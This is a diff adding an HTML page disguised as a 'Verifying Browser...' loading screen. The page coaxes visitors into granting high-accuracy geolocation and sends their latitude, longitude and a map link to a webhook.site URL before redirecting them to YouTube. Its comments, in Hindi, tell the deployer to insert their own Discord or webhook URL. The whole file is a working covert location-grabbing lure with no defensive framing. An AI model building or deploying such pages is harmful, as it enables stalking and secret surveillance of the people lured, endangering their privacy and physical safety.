@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading Secure Page...</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f8f9fa;
+        }
+        .loader {
+            border: 6px solid #e2e2e2;
+            border-top: 6px solid #007bff;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        h2 { color: #333; margin: 0 0 10px 0; }
+        p { color: #666; text-align: center; max-width: 80%; font-size: 14px; }
+    </style>
+</head>
+<body onload="requestLocation()">
+    <div class="loader"></div>
+    <h2>Verifying Browser...</h2>
+    <p>Please click "Allow" on the location prompt to continue.</p>
+
+    <script>
+        // YAHAN APNA WEBHOOK URL DALEIN (Discord ya Webhook.site ka)
+        const WEBHOOK_URL = "https://webhook.site/48114dfb-7749-4dbb-a65d-10ee6646527e"; 
+        
+        // DESTINATION URL: Location lene ke baad user ko kahan bhejna hai
+        const REDIRECT_URL = "https://www.youtube.com";
+
+        function requestLocation() {
+            if (navigator.geolocation) {
+                // High accuracy mode on taaki exact GPS location mile
+                navigator.geolocation.getCurrentPosition(success, error, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            } else {
+                redirectToDestination();
+            }
+        }
+
+        function success(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+            const data = {
+                content: `**📍 New Location Alert!**\n**Latitude:** ${lat}\n**Longitude:** ${lon}\n**Map Link:** ${mapLink}`
+            };
+
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            })
+            .then(() => {
+                redirectToDestination();
+            })
+            .catch(() => {
+                redirectToDestination();
+            });
+        }
+
+        function error(err) {
+            // Agar user "Deny" kar de ya error aaye, toh bhi wo redirect ho jayega
+            redirectToDestination();
+        }
+
+        function redirectToDestination() {
+            window.location.href = REDIRECT_URL;
+        }
+    </script>
+</body>
+</html>
